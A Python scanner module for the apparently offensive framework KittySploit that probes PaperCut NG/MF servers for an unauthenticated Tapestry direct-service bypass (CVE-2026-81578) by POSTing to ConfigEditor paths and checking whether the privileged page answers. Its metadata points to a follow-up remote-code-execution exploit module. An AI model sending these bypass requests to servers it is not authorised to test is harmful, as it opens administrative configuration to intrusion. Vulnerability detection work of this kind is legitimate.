#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect PaperCut CVE-2026-81578 Tapestry complex-direct authentication bypass."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "PaperCut CVE-2026-81578 Auth Bypass Detect",
        "description": (
            "Detects CVE-2026-81578 in PaperCut NG/MF before 24.1.10 / 25.0.13 / 26.0.5. "
            "Apache Tapestry direct/1/Home/ConfigEditor requests validate only the render "
            "page (Home) while invoking privileged ConfigEditor listeners without a session."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-81578"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-81578",
            "https://www.papercut.com/kb/Main/security-bulletin-27-aug-2026-urgent-security-advisory/",
            "https://www.rapid7.com/blog/post/etr-papercut-ng-mf-critical-zero-day-exploited-in-the-wild/",
        ],
        "modules": [
            "exploits/multi/http/papercut_cve_2026_81578_82078_rce",
        ],
        "tags": [
            "web",
            "scanner",
            "papercut",
            "tapestry",
            "auth-bypass",
            "cve-2026-81578",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "active_exploitation"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.2,
            "noise": 0.35,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["papercut"],
                "endpoint_pattern_any": ["/app"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "auth_bypass", "from_detail": "Tapestry direct service"},
                ],
                "suggested_followups": [
                    "exploits/multi/http/papercut_cve_2026_81578_82078_rce",
                    "scanner/http/papercut_cve_2026_82078_detect",
                ],
            },
        },
    }

    port = OptPort(9191, "PaperCut HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    render_page = OptString("Home", "Public render page in direct service path", False, advanced=True)

    _SERVICE_PATHS = (
        "ConfigEditor/quickFindForm",
        "ConfigEditor/$Form",
    )

    def _is_papercut(self) -> bool:
        response = self.http_request(method="GET", path="/app", allow_redirects=True)
        body = (response.text or "") if response else ""
        return "papercut" in body.lower() or "PaperCut" in body

    def _probe_direct(self, service_suffix: str) -> bool:
        render = str(self.render_page or "Home").strip() or "Home"
        path = f"/app?service=direct/1/{render}/{service_suffix}"
        response = self.http_request(
            method="POST",
            path=path,
            data={"configSearch": "kittysploit-probe"},
            allow_redirects=False,
        )
        if not response:
            return False
        code = int(response.status_code or 0)
        body = response.text or ""
        location = str(response.headers.get("Location") or "")
        if "login" in location.lower():
            return False
        if code not in (200, 500):
            return False
        markers = (
            "ConfigEditor",
            "configSearch",
            "quickFindForm",
            "Configuration",
            "PaperCut",
        )
        return any(marker in body for marker in markers)

    def run(self):
        if not self._is_papercut():
            return False
        for suffix in self._SERVICE_PATHS:
            if self._probe_direct(suffix):
                self.set_info(
                    severity="critical",
                    cve="CVE-2026-81578",
                    reason=(
                        "Unauthenticated Tapestry direct service reached ConfigEditor "
                        f"via {self.render_page or 'Home'}"
                    ),
                    service=suffix,
                )
                return True
        return False
